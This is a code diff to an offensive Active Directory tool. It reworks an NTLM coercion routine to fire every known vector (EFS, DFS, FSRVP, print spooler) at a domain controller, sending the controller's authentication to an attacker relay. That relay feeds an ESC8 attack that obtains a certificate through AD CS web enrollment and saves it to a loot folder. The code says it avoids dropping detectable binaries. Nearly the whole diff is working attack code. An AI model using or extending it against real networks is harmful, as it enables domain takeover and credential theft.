@@ -2104,57 +2104,50 @@ def _default_src_ip(target_hint=None):
     return None
 
 
-def _fire_coercion(dc, unc, domain, username, password, lmhash, nthash, timeout):
-    """Bind MS-EFSR on the DC and fire its UNC-taking methods with a path that
-    points at our relay, which makes the DC's machine account authenticate to
-    us. Returns True if a call went out. No listener here: the relay server is
-    what catches the auth."""
-    desc = COERCION_DB.get('c681d488-d850-11d0-8c52-00c04fd90f7e')  # MS-EFSR
-    if not desc:
-        return False
-    sent = False
-    for pipe in ('lsarpc', 'efsrpc'):
-        sb = r'ncacn_np:%s[\PIPE\%s]' % (dc, pipe)
+def _fire_all_coercions(dc, domain, username, password, hashes, listener_ip,
+                        timeout):
+    """Fire every known coercion vector (EFS, DFS, FSRVP, spooler) at the DC
+    with a UNC pointing at our relay, reusing the tool's proven coercion path so
+    the auth level, transport fallback, and error handling are correct. No
+    callback listener: the relay server is what catches the auth. Prints a
+    per-vector reason and returns True if any vector reached out."""
+    mapper = RPCAuthMap(
+        username=username, password=password, domain=domain, hashes=hashes,
+        timeout=timeout, show_all=False, probe_pipes=True, do_brute=False,
+        do_coerce=True, listener=None, listener_ip=listener_ip,
+        coerce_timeout=1, debug=True)
+    fired = False
+    for _uuid, desc in COERCION_DB.items():
         try:
-            rpctransport = transport.DCERPCTransportFactory(sb)
-            rpctransport.set_connect_timeout(timeout)
-            if hasattr(rpctransport, 'set_credentials'):
-                rpctransport.set_credentials(username, password, domain,
-                                             lmhash or '', nthash or '')
-            dce = rpctransport.get_dce_rpc()
-            dce.connect()
-            dce.bind(uuidtup_to_bin(desc['uuidtup']))
-        except Exception:
+            hits = mapper.coerce_probe(dc, desc)
+        except Exception as e:
+            print(c('    %s: coercion error: %s'
+                    % (desc['label'], str(e).split(chr(10))[0][:70]), C.GREY))
             continue
-        for method_name, arg_name, fire in desc['triggers']:
-            try:
-                fire(dce, unc, dc)
-                sent = True
-                print(c('[*] fired %s via \\PIPE\\%s' % (method_name, pipe),
-                        C.CYAN))
-            except Exception as e:
-                if any(code in str(e) for code in _EXPECTED_COERCE_ERRORS):
-                    sent = True
-                    print(c('[*] fired %s via \\PIPE\\%s (post-dial path error, '
-                            'reached out)' % (method_name, pipe), C.CYAN))
-        try:
-            dce.disconnect()
-        except Exception:
-            pass
-        if sent:
-            break
-    return sent
+        for h in hits:
+            st = h.get('status')
+            why = h.get('reason', '')
+            if h.get('confirmed') or st == 'sent':
+                fired = True
+                print(c('[*] %s / %s: FIRED (%s)'
+                        % (desc['label'], h['method'], why), C.CYAN))
+            else:
+                print(c('    %s / %s: %s (%s)'
+                        % (desc['label'], h['method'], st, why), C.GREY))
+    return fired
 
 
 def esc8_attack(dc, ca, template, domain, username, password, lmhash, nthash,
-                listener_ip, listener_port, timeout, loot_dir, wait):
+                listener_ip, listener_port, timeout, loot_dir, wait,
+                verbose=False):
     """Relay a coerced DC machine account into the AD CS web enrollment on `ca`
     to issue a certificate (ESC8). Runs from impacket library internals only, so
     no signatured external binary is dropped. Returns the issued .pfx path or
-    None."""
+    None. verbose raises impacket's own logging to DEBUG so the NTLM exchange
+    and the enrollment HTTP are shown in full."""
     import glob
     import logging
-    logging.basicConfig(level=logging.INFO,
+    logging.basicConfig(level=logging.DEBUG if verbose else logging.INFO,
                         format='%(asctime)s %(levelname)s %(message)s')
     try:
         from impacket.examples.ntlmrelayx.servers import SMBRelayServer
@@ -2199,11 +2192,13 @@ def esc8_attack(dc, ca, template, domain, username, password, lmhash, nthash,
         return None
     time.sleep(1.0)
 
-    unc = '\\\\%s\\%s\\file' % (listener_ip, _rand_tag())
-    if not _fire_coercion(dc, unc, domain, username, password, lmhash, nthash,
-                          timeout):
-        print(c('[-] coercion did not fire; check creds and that the DC exposes '
-                'MS-EFSR.', C.YELLOW))
+    hashes = ('%s:%s' % (lmhash, nthash)) if nthash else None
+    print(c('[*] firing coercion vectors at %s (callback -> %s)...'
+            % (dc, listener_ip), C.CYAN))
+    if not _fire_all_coercions(dc, domain, username, password, hashes,
+                               listener_ip, timeout):
+        print(c('[-] no coercion vector fired; see the per-vector reasons above '
+                '(creds, pipe presence, or firewall).', C.YELLOW))
 
     print(c('[*] waiting up to %ds for the certificate to be issued...' % wait,
             C.CYAN))
@@ -2395,7 +2390,8 @@ def main():
         pfx = esc8_attack(dc, options.ca, options.template, domain, username,
                           password, lmhash, nthash, lip, options.listener_port,
                           options.timeout, options.loot, options.coerce_timeout
-                          if options.coerce_timeout > 5 else 60)
+                          if options.coerce_timeout > 5 else 60,
+                          verbose=options.verbose)
         sys.exit(0 if pfx else 2)
 
     # coerce/hunt need a callback IP; auto-detect it if the user did not give one.
